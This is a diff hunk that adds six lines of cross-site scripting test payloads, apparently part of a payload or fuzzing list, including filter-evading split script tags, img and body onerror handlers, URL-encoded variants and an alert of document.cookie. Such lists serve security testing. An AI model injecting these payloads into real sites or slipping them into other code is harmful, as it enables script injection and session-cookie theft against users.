@@ -1,0 +1,6 @@
+</scrip</script>t><img src=q onerror=prompt(8)>
+<script>alert(document.cookie)</script>
+</scrip</script>t><img%20src=q%20onerror=prompt(11)>
+<<<</scrip</script>t><img%20src=q%20onerror=prompt(12)>
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+ javascriptalert
